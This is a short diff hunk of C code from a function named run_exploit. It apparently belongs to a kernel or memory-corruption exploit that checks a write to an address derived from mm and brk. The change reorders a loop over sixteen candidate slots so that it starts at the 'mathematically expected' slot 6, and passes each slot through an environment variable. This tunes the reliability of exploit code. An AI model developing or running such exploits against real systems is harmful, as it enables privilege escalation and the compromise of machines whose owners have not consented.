@@ -964,7 +964,8 @@ int run_exploit(int argc, char **argv) {
         pr_info("VERIFY: target=%016zx (mm+brk) value=%016llx\n",
                 vt, (unsigned long long)magic);
         unsigned long orig_brk = (unsigned long)syscall(SYS_brk, 0);
-        for (int slot = 0; slot <= 15; slot++) {
+        for (int i = 0; i <= 15; i++) {
+          int slot = (6 + i) % 16; /* start at the mathematically expected 6 */
           char s[8];
           snprintf(s, sizeof(s), "%d", slot);
           setenv("PVM_W0_SLOT", s, 1);
